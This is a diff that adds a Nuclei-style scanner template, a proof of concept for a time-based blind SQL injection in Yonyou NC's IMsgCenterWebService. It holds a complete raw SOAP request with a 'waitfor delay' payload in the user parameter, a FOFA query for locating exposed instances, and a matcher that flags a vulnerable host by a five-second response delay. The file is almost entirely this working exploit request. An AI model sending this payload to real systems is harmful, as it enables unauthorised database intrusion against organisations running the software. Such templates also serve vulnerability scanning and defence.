@@ -1,0 +1,22 @@
+id: poc-szn0f9kef61tx72n
+info:
+  name: 用友NC IMsgCenterWebService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/szn0f9kef61tx72n
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: szn0f9kef61tx72n
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - "POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: urn:doAction\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ims=\"http://msgcenter.itf.nc/IMsgCenterWebService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ims:doAction>\n         <!--type: string-->\n         <dataSource>NC65</dataSource>\n         <!--type: string-->\n         <actionCode>test</actionCode>\n         <!--type: string-->\n         <pluginType>test</pluginType>\n         <!--type: string-->\n         <param>{\"user\":\"'waitfor delay'0:0:5\",\"pk_sourcemsg\":\"\"}</param>\n      </ims:doAction>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
